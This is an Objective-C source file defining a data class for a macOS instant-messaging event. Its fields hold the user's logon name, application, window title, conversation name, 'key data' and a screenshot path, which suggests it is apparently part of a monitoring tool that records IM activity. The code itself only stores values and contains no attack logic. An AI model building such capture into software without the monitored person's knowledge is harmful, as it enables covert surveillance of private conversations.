//
//  FxIMMacOSEvent.m
//  FxEvents
//
//  Created by Makara Khloth on 2/2/15.
//
//

#import "FxIMMacOSEvent.h"

@implementation FxIMMacOSEvent
@synthesize mUserLogonName, mApplicationID, mApplicationName, mTitle, mIMServiceID, mConversationName, mKeyData, mSnapshotFilePath;

- (id) init {
    self = [super init];
    if (self) {
        [self setEventType:kEventTypeIMMacOS];
    }
    return (self);
}

- (void) dealloc {
    [self setMUserLogonName:nil];
    [self setMApplicationID:nil];
    [self setMApplicationName:nil];
    [self setMTitle:nil];
    [self setMConversationName:nil];
    [self setMKeyData:nil];
    [self setMSnapshotFilePath:nil];
    [super dealloc];
}

@end
